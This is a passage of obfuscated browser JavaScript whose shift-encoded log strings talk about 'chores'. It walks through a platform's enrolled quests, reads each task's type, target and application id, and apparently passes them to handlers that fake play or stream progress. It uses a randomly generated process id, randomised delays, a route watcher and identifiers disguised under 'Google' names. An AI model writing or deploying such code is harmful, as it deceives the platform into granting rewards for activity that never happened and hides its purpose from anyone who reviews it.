",M]AFMPCQ]UCPC]ML]RFC]JGQR]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]JGQR]MD]AFMPCQ]U?Q]CKNRW]—]QIGNNGLE]RFC]PMSLBk"),_0xlex.d(",M]AFMPCQ]UCPC]ML]RFC]JGQR]—]QIGNNGLE]RFC]PMSLBk"),_0xlex.d("2FC]AFMPC]JGQR]A?KC]@?AI]@J?LI]—]KMTGLE]MLk"),_0xlex.d("2FC]AFMPC]JGQR]A?KC]@?AI]@J?LI]—]QIGNNGLE]RFC]PMSLBk")])); return "skipped"; }
        let _0x16 = GoogleRoutes.tasks.find(t => Object.hasOwn(_0x15.tasks, t));
        let _0x17 = _0x16 ? _0x15.tasks[_0x16] : null;
        let _0x19 = Number(_0x17?.target);
        if (!Number.isFinite(_0x19) || _0x19 <= 0) { Log.say(_0xlex.C(0), _0xlex.P(16,[_0xlex.d("!FMPC]R?PECR]BGB]LMR]N?PQC]—]KMTGLE]MLk"),_0xlex.d("!FMPC]R?PECR]U?Q]GLT?JGB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("!FMPC]R?PECR]U?Q]GLT?JGB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("!FMPC]R?PECR]BGB]LMR]N?PQC]—]JC?TGLE]GR]@Ck"),_0xlex.d("!FMPC]R?PECR]A?KC]@?AI]SLSQ?@JC]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]AFMPC]R?PECR]U?Q]K?JDMPKCB]—]JC?TGLE]GR]@Ck"),_0xlex.d("!FMPC]R?PECR]BGB]LMR]N?PQC]—]LMR]QR?PRGLE]GRk"),_0xlex.d("!FMPC]R?PECR]BGB]LMR]N?PQC]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]AFMPC]R?PECR]U?Q]K?JDMPKCB]—]KMTGLE]MLk"),_0xlex.d("2FC]R?PECR]DMP]RFC]AFMPC]U?Q]@?B]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]R?PECR]DMP]RFC]AFMPC]U?Q]@?B]—]JC?TGLE]GR]@Ck"),_0xlex.d("!FMPC]R?PECR]U?Q]GLT?JGB]—]KMTGLE]MLk"),_0xlex.d("!FMPC]R?PECR]A?KC]@?AI]SLSQ?@JC]—]QIGNNGLE]GRk"),_0xlex.d("!FMPC]R?PECR]U?Q]GLT?JGB]—]JC?TGLE]GR]@Ck"),_0xlex.d("!FMPC]R?PECR]A?KC]@?AI]SLSQ?@JC]—]QIGNNGLE]RFGQ]MLCk")])); return "skipped"; }
        let _0x18 = _0x11.config?.application?.id ?? _0x17?.applications?.[0]?.id;
        if ((_0x16 === GoogleTasks.play || _0x16 === GoogleTasks.stream) && !_0x18) { Log.say(_0xlex.C(0), _0xlex.P(17,[_0xlex.d("!FMPC]A?KC]UGRFMSR]?L]?NNJGA?RGML]GB]—]QIGNNGLEk"),_0xlex.d("!FMPC]A?KC]UGRFMSR]?L]?NNJGA?RGML]GB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("!FMPC]F?B]LM]?NN]GBCLRGDGCP]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("2FC]AFMPC]J?AICB]?L]?NNJGA?RGML]GB]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d("!FMPC]F?B]LM]?NN]GBCLRGDGCP]—]KMTGLE]MLk"),_0xlex.d(",M]?NNJGA?RGML]GB]ML]RFC]AFMPC]—]QIGNNGLEk"),_0xlex.d("2FC]AFMPC]J?AICB]?L]?NNJGA?RGML]GB]—]KMTGLE]MLk"),_0xlex.d("!FMPC]F?B]LM]?NNJGA?RGML]GBCLRGDGCP]—]JC?TGLE]GR]@Ck"),_0xlex.d(",M]?NNJGA?RGML]GB]ML]RFC]AFMPC]—]KMTGLE]MLk"),_0xlex.d(",M]?NNJGA?RGML]GB]ML]RFC]AFMPC]—]QIGNNGLE]RFGQ]MLCk"),_0xlex.d(",M]?NNJGA?RGML]GB]ML]RFC]AFMPC]—]LMR]QR?PRGLE]GRk"),_0xlex.d("2FC]AFMPC]J?AICB]?L]?NNJGA?RGML]GB]—]JC?TGLE]GR]@Ck"),_0xlex.d("!FMPC]A?KC]UGRFMSR]?L]?NNJGA?RGML]GB]—]LMR]QR?PRGLE]GRk"),_0xlex.d("!FMPC]A?KC]UGRFMSR]?L]?NNJGA?RGML]GB]—]JC?TGLE]GR]@Ck"),_0xlex.d("!FMPC]F?B]LM]?NNJGA?RGML]GBCLRGDGCP]—]LMR]QR?PRGLE]GRk")])); return "skipped"; }
        let _0x1a = _0x11.userStatus?.progress?.[_0x16]?.value ?? 0;
        let _0x1b = Math.floor(Math.random() * 60000) + 4096;
        const fn = GoogleHandlers[_0x16]; if (!fn) return "unsupported";
        await fn({ q: _0x11, taskType: _0x16, name: _0x11.config?.messages?.questName ?? "that quest", app: _0x18, goal: _0x19, cur: _0x1a, pid: _0x1b, cfgv: _0x11.config?.configVersion });
        return "processed";
      };

      let _0xstarted = false;
      const _0x2c = async () => {
        if (_0xstarted) return; _0xstarted = true;
                let didWork = false; const _0xresults = []; const _0xdone = new Set();
        const _0xrefill = () => {
          try {
            const _0v = _0x5.quests.values;
            const _0list = typeof _0v === "function" ? Array.from(_0v.call(_0x5.quests)) : [];
            let _0added = 0;
            for (const q of _0list) {
              if (!q || typeof q !== "object" || !q.id || _0xdone.has(q.id)) continue;
              if (_0xb.some(x => x && x.id === q.id)) continue;
              if (!q.userStatus?.enrolledAt || q.userStatus?.completedAt) continue;
              const _0e = new Date(q.config?.expiresAt).getTime();
              if (Number.isFinite(_0e) && _0e <= Date.now() - 5 * 60 * 1000) continue;
              if (!_0x79a4(q.config, GoogleRoutes.tasks)?.tasks) continue;
              _0xb.push(q); _0xdone.add(q.id); _0added++;
            }
            return _0added;
          } catch (e) { return 0; }
        };
        try {
          _0xwatch = setInterval(() => { if (_0xkill || signal.aborted) { clearInterval(_0xwatch); _0xwatch = null; return; } const p = location.pathname; if (!_0xpaus && p !== _0xroute0) { _0xpaus = true; Log.say(_0xlex.C(8), _0xlex.P(48,[_0xlex.d("2P?GJ]K?PICP]KMTCB]—]N?PICB]FCPCk"),_0xlex.d("+MTCB]MDD]RFC]K?GL]RP?GJ]—]FMJBGLE]DMP]LMUk"),_0xlex.d("2P?GJ]K?PICP]QFGDRCB]—]QR?WGLE]NSRk"),_0xlex.d("+MTCB]MDD]RFC]K?GL]RP?GJ]—]QR?WGLE]NSRk"),_0xlex.d(".?SQCB]ML]RFC]RP?GJ]—]N?PICB]FCPCk"),_0xlex.d(".?SQCB]ML]RFC]RP?GJ]—]FMJBGLE]NMQGRGMLk"),_0xlex.d("1RCNNCB]MDD]RFC]RP?GJ]—]FMJBGLE]NMQGRGMLk"),_0xlex.d("1RCNNCB]MDD]RFC]RP?GJ]—]QR?WGLE]NSRk"),_0xlex.d("1RCNNCB]MDD]RFC]RP?GJ]—]N?PICB]FCPCk"),_0xlex.d(".?SQCB]ML]RFC]RP?GJ]—]FMJBGLE]DMP]LMUk"),_0xlex.d(".?SQCB]ML]RFC]RP?GJ]—]QR?WGLE]NSRk"),_0xlex.d("+MTCB]MDD]RFC]K?GL]RP?GJ]—]FMJBGLE]NMQGRGMLk"),_0xlex.d("2P?GJ]K?PICP]QFGDRCB]—]FMJBGLE]QRGJJk"),_0xlex.d("2P?GJ]K?PICP]QFGDRCB]—]N?PICB]FCPCk"),_0xlex.d("1RCNNCB]MDD]RFC]RP?GJ]—]FMJBGLE]QRGJJk")])); } else if (_0xpaus && p === _0route0) { _0xpaus = false; Log.say(_0xlex.C(8), _0xlex.P(49,[_0xlex.d("0CRSPLCB]RM]RFC]RP?GJ]—]ML]RFC]KMTC]?E?GLk"),_0xlex.d(" ?AI]ML]RFC]K?GL]RP?GJ]—]NGAIGLE]SN]?E?GLk"),_0xlex.d(" ?AI]ML]RFC]RP?GJ]—]KMTGLE]?E?GLk"),_0xlex.d(" ?AI]ML]RFC]RP?GJ]—]PCQSKGLEk"),_0xlex.d("-L]RFC]RP?GJ]?E?GL]—]NGAIGLE]SN]?E?GLk"),_0xlex.d("-L]RFC]RP?GJ]?E?GL]—]ML]RFC]KMTC]?E?GLk"),_0xlex.d("0CRSPLCB]RM]RFC]RP?GJ]—]KMTGLE]?E?GLk"),_0xlex.d(" ?AI]RM]RFC]RP?GJ]—]ML]RFC]KMTC]?E?GLk"),_0xlex.d(" ?AI]RM]RFC]RP?GJ]—]PCQSKGLEk"),_0xlex.d(" ?AI]ML]RFC]RP?GJ]—]ML]RFC]KMTC]?E?GLk"),_0xlex.d("0CRSPLCB]RM]RFC]RP?GJ]—]PCQSKGLEk"),_0xlex.d(" ?AI]RM]RFC]RP?GJ]—]NGAIGLE]SN]?E?GLk"),_0xlex.d(" ?AI]RM]RFC]RP?GJ]—]PCQSKGLE]RFC]PSLk"),_0xlex.d(" ?AI]ML]RFC]K?GL]RP?GJ]—]ML]RFC]KMTC]?E?GLk"),_0xlex.d("-L]RFC]RP?GJ]?E?GL]—]PCQSKGLE]RFC]PSLk")])); } }, 2500);
          _0xe8a7(() => { if(_0xwatch) clearInterval(_0xwatch); });
          while (!_0xkill && !signal.aborted) {
            if (!_0xb.length) {
              const _0new = _0xrefill();
              if (_0new > 0) { Log.say(_0xlex.C(2), _0xlex.P(23,[`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]A?KC]GL]?DRCP]RFC]@CJJ]RM]HMGL]RFC]@M?PBk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]HMGLCB]RFC]@M?PB]KGBjQFGDRk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]HMGLCB]RFC]@M?PBk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]HMGLCB]RFC]@M?PB]UFGJC]UC]UMPICBk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]HMGLCB]RFC]@M?PB]?DRCP]QR?PRk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]A?KC]GL]?DRCP]RFC]@CJJ]RM]FCJNk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]HMGLCB]RFC]@M?PB]J?RCk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]A?KC]GL]?DRCP]RFC]@CJJ]?LB]HMGLCB]SNk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]HMGLCB]RFC]@M?PB]@CDMPC]RFC]CLBk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]A?KC]GL]?DRCP]RFC]@CJJ]U?Q]PSLEk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]A?KC]GL]?DRCP]RFC]@CJJi]PCDGJJCBk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]A?KC]GL]?DRCP]RFC]@CJJx]HMGLGLE]RFC]@M?PBk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]HMGLCB]RFC]@M?PB]DMP]RFC]LCVR]N?QQk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]HMGLCB]RFC]@M?PBi]PCDGJJCBk")}`,`${_0new}${_0xlex.d("]KMPC]AFMPC")}${_0new === 1 ? "" : "s"}${_0xlex.d("]HMGLCB]RFC]@M?PB]?LB]AMSLRCBk")}`])); continue; }
              break;
            }
            let _0x2d = _0xb.pop(); if (!_0x2d) continue;
            _0xdone.add(_0x2d.id);
            try { didWork = true; const result = await _0x10(_0x2d) ?? "processed"; _0xresults.push({ name: _0x2d.config?.messages?.questName ?? "quest", result }); }
            catch (err) { _0xresults.push({ name: _0x2d.config?.messages?.questName ?? "quest", result: "failed" }); Log.say(_0xlex.C(0), _0xlex.P(18,[`${_0xlex.d("0MSEF]N?RAF]ML]MLC]AFMPCw]")}${err?.message ?? err}`,`${_0xlex.d("&GR]?]QL?E]ML]MLC]AFMPCw]")}${err?.message ?? err}`,`${_0xlex.d("-LC]AFMPC]A?KC]@?AI]QGBCU?WQw]")}${err?.message ?? err}`,`${_0xlex.d("-LC]AFMPC]RFPCU]?]DGRw]")}${err?.message ?? err}`,`${_0xlex.d("-LC]AFMPC]QJGNNCBw]")}${err?.message ?? err}`,`${_0xlex.d("-LC]AFMPC]DCJJ]MTCPw]")}${err?.message ?? err}`,`${_0xlex.d("-LC]AFMPC]IGAICB]@?AIw]")}${err?.message ?? err}`,`${_0xlex.d("!?SEFR]?L]CBEC]ML]MLC]AFMPCw]")}${err?.message ?? err}`,`${_0xlex.d("$SK@JCB]MLC]AFMPCw]")}${err?.message ?? err}`,`${_0xlex.d("-LC]AFMPC]UCLR]QGBCU?WQw]")}${err?.message ?? err}`,`${_0xlex.d("1L?EECB]?]L?GJ]ML]MLC]AFMPCw]")}${err?.message ?? err}`,`${_0xlex.d("-LC]AFMPC]KGQ@CF?TCBw]")}${err?.message ?? err}`,`${_0xlex.d("\"PMNNCB]MLC]AFMPCw]")}${err?.message ?? err}`,`${_0xlex.d("~]AFMPC]RFPCU]?L]CPPMPw]")}${err?.message ?? err}`,`${_0xlex.d("0?L]GLRM]RPMS@JC]ML]MLC]AFMPCw]")}${err?.message ?? err}`])); }
            if (_0xb.length && !_0xkill && !signal.aborted) {
              let _0xgn = false;
              try {
                const _0xnq = _0xb[_0xb.length - 1];
                const _0nt = _0x79a4(_0xnq.config, GoogleRoutes.tasks)?.tasks;
                if (_0nt) { const _0nf = GoogleRoutes.tasks.find(t => Object.hasOwn(_0nt, t)); _0xgn = (_0nf === GoogleTasks.play || _0nf === GoogleTasks.stream); }
              } catch (e) {}
              await GoogleDelay(_0xgn ? 60 + Math.random() * 240 : 10 + Math.random() * 38);
            }
          }
while (_0x8844.size > 0 && !_0xkill && !signal.aborted) await GoogleDelay(1);
try { MemberCount.summary(); } catch (e) {}
          if (_0xkill || signal.aborted) Log.say(_0xlex.C(6), _0xlex.P(26,[`${_0xlex.d("*?QR]A?JJ]—]QFGDR]ASR]QFMPR]—]UGRF]")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("k")}`,`${_0xlex.d("*?QR]A?JJ]—]QFGDR]CLBCB]C?PJW]—]UGRF]")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("k")}`,`${_0xlex.d("*?QR]A?JJ]—]QFGDR]CLBCB]C?PJW]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("f]GL]F?LBk")}`,`${_0xlex.d("*?QR]A?JJ]—]QFGDR]ASR]QFMPR]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("f]GL]F?LBk")}`,`${_0xlex.d("*?QR]A?JJ]—]QFGDR]ASR]QFMPR]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk")}`,`${_0xlex.d("*?QR]A?JJ]—]RFC]QFGDR]QRMNNCB]C?PJW]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk")}`,`${_0xlex.d("*?QR]A?JJ]—]QRMNNGLE]C?PJW]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("f]JMEECBk")}`,`${_0xlex.d("*?QR]A?JJ]—]PSL]CLBCB]C?PJW]—]")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("]PCAMPBCBk")}`,`${_0xlex.d("*?QR]A?JJ]—]QRMNNGLE]C?PJW]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk")}`,`${_0xlex.d("*?QR]A?JJ]—]RFC]QFGDR]QRMNNCB]C?PJW]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("f]GL]F?LBk")}`,`${_0xlex.d("*?QR]A?JJ]—]PSL]CLBCB]C?PJW]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("f]JMEECBk")}`,`${_0xlex.d("*?QR]A?JJ]—]PSL]CLBCB]C?PJW]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk")}`,`${_0xlex.d("*?QR]A?JJ]—]RFC]QFGDR]QRMNNCB]C?PJW]—]")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("]PCAMPBCBk")}`,`${_0xlex.d("*?QR]A?JJ]—]QFGDR]ASR]QFMPR]—]")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("]PCAMPBCBk")}`,`${_0xlex.d("*?QR]A?JJ]—]QRMNNGLE]C?PJW]—]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("f]GL]F?LBk")}`]));
          else if (didWork) Log.say(_0xlex.C(3), _0xlex.P(40,[`${_0xlex.d("1FCJD]EJC?KGLE]AMKNJCRCJW]—]AJC?P]@M?PB]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk].PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRk")}`,`${_0xlex.d("1FCJD]NMJGQFCBi]?JJ]MD]GR]—]BMLC]?LB]AJC?P]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`,`${_0xlex.d("1FCJD]DSJJW]AJC?PCB]—]LMRFGLE]PCK?GLQ]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`,`${_0xlex.d("1FCJD]DSJJW]AJC?PCB]—]LMRFGLE]JCDR]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`,`${_0xlex.d("1FCJD]DSJJW]AJC?PCB]—]AJC?P]@M?PB]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk].PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRk")}`,`${_0xlex.d("1FCJD]NMJGQFCB]AMKNJCRCJW]—]LMRFGLE]JCDR]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk].PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRk")}`,`${_0xlex.d("1FCJD]DSJJW]AJC?PCB]—]LMRFGLE]JCDR]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk].PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRk")}`,`${_0xlex.d("1FCJD]NMJGQFCB]AMKNJCRCJW]—]LMRFGLE]JCDR]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("f]PCAMPBCBk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`,`${_0xlex.d("1FCJD]EJC?KGLE]AMKNJCRCJW]—]LMRFGLE]JCDR]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk].PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRk")}`,`${_0xlex.d("1FCJD]EJC?KGLE]—]LMRFGLE]PCK?GLQ]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`,`${_0xlex.d("1FCJD]NMJGQFCBi]?JJ]MD]GR]—]LMRFGLE]PCK?GLQ]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`,`${_0xlex.d("1FCJD]EJC?KGLE]AMKNJCRCJW]—]LMRFGLE]JCDR]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("f]PCAMPBCBk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`,`${_0xlex.d("1FCJD]NMJGQFCB]—]LMRFGLE]PCK?GLQ]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`,`${_0xlex.d("1FCJD]NMJGQFCB]—]LMRFGLE]JCDR]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`,`${_0xlex.d("1FCJD]NMJGQFCB]AMKNJCRCJW]—]LMRFGLE]PCK?GLQ]e")}${_0xresults.length}${_0xlex.d("]?ARGTGRW]PCQSJR")}${_0xresults.length === 1 ? "" : "s"}${_0xlex.d("fk]e.PCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PRf")}`]));
        } catch (err) { Log.say(_0xlex.C(0), _0xlex.P(19,[`${_0xlex.d("!?SEFR]?L]CBECw]")}${err?.message ?? err}`,`${_0xlex.d("\"PMNNCB]RFC]RP?Ww]")}${err?.message ?? err}`,`${_0xlex.d("2FPCU]?L]CPPMP]?R]RFC]RMNw]")}${err?.message ?? err}`,`${_0xlex.d("$MSJCB]?]QRCNw]")}${err?.message ?? err}`,`${_0xlex.d("!?SEFR]?]QL?Ew]")}${err?.message ?? err}`,`${_0xlex.d("0?L]?EPMSLBw]")}${err?.message ?? err}`,`${_0xlex.d("5CLR]QGBCU?WQw]")}${err?.message ?? err}`,`${_0xlex.d("0?L]GLRM]RPMS@JCw]")}${err?.message ?? err}`,`${_0xlex.d("1JGNNCB]SN]RMNw]")}${err?.message ?? err}`,`${_0xlex.d(")GAICB]@?AI]?L]CPPMPw]")}${err?.message ?? err}`,`${_0xlex.d(" PMIC]QRPGBCw]")}${err?.message ?? err}`,`${_0xlex.d("1L?EECB]?]L?GJw]")}${err?.message ?? err}`,`${_0xlex.d("$SK@JCB]?]QRCNw]")}${err?.message ?? err}`,`${_0xlex.d("&GR]?]U?JJ]SN]RMNw]")}${err?.message ?? err}`,`${_0xlex.d("&GR]?]QL?Ew]")}${err?.message ?? err}`])); } 
        finally { _0x1 = _0x2 = _0x3 = _0x4 = _0x5 = _0x6 = _0x7 = _0x8 = _0x9 = _0xb = null; if (!didWork && !_0xkill) GoogleRelease(); }
        if (didWork || _0xkill || signal.aborted) { _0xarmed = true; Log.say(_0xlex.C(9), (didWork && !_0xkill && !signal.aborted) ? _0xlex.P(28,[_0xlex.d("#TCPWRFGLEdQ]NMJGQFCBi]?JJ]MD]GR]—]NPCQQ]~JRh1FGDRh0]UFCL]WMS]?PC]BMLCx]RFC]PSL]QGRQ]GBJC]SLRGJ]WMS]BMk"),_0xlex.d("~JJ]NMJGQFCB]—]NPCQQ]~JRh1FGDRh0]RM]DJSQF]?LB]PCQR?PR]ePCDPCQFf]UFCLCTCPx]RFC]PSL]QR?WQ]N?PICBk"),_0xlex.d("~JJ]NMJGQFCB]SN]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFf]GD]WMS]U?LR]?]AJC?L]QJ?RCx]MRFCPUGQC]LMRFGLE]CJQC]F?NNCLQk"),_0xlex.d("~JJ]NMJGQFCB]—]NPCQQ]~JRh1FGDRh0]UFCL]WMS]?PC]BMLCx]RFC]PSL]QGRQ]GBJC]SLRGJ]WMS]BMk"),_0xlex.d("~JJ]NMJGQFCBi]BMLC]DMP]LMU]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFf]UFCL]PC?BWx]LMRFGLE]PSLQ]SLRGJ]RFCLk"),_0xlex.d("#TCPWRFGLEdQ]NMJGQFCBi]?JJ]MD]GR]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFf]GD]WMS]U?LR]?]AJC?L]QJ?RCx]MRFCPUGQC]LMRFGLE]CJQC]F?NNCLQk"),_0xlex.d("~JJ]NMJGQFCB]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFfi]MP]HSQR]ICCN]@PMUQGLEx]LMRFGLE]KMTCQ]SLRGJ]WMS]Q?W]QMk"),_0xlex.d("#TCPWRFGLEdQ]NMJGQFCBi]?JJ]MD]GR]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFf]UFCL]PC?BWx]LMRFGLE]PSLQ]SLRGJ]RFCLk"),_0xlex.d("#TCPWRFGLEdQ]NMJGQFCB]—]NPCQQ]~JRh1FGDRh0]UFCL]WMS]?PC]BMLCx]RFC]PSL]QGRQ]GBJC]SLRGJ]WMS]BMk"),_0xlex.d("~JJ]NMJGQFCB]SN]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFf]UFCL]PC?BWx]LMRFGLE]PSLQ]SLRGJ]RFCLk"),_0xlex.d("~JJ]NMJGQFCBi]BMLC]DMP]LMU]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFfi]MP]HSQR]ICCN]@PMUQGLEx]LMRFGLE]KMTCQ]SLRGJ]WMS]Q?W]QMk"),_0xlex.d("~JJ]NMJGQFCBi]BMLC]DMP]LMU]—]NPCQQ]~JRh1FGDRh0]UFCL]WMS]?PC]BMLCx]RFC]PSL]QGRQ]GBJC]SLRGJ]WMS]BMk"),_0xlex.d("~JJ]NMJGQFCBi]BMLC]DMP]LMU]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFf]GD]WMS]U?LR]?]AJC?L]QJ?RCx]MRFCPUGQC]LMRFGLE]CJQC]F?NNCLQk"),_0xlex.d("~JJ]NMJGQFCB]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFf]GD]WMS]U?LR]?]AJC?L]QJ?RCx]MRFCPUGQC]LMRFGLE]CJQC]F?NNCLQk"),_0xlex.d("~JJ]NMJGQFCB]SN]—]NPCQQ]~JRh1FGDRh0]RM]QF?IC]MSR]RFC]PSE]ePCDPCQFfi]MP]HSQR]ICCN]@PMUQGLEx]LMRFGLE]KMTCQ]SLRGJ]WMS]Q?W]QMk")]) : 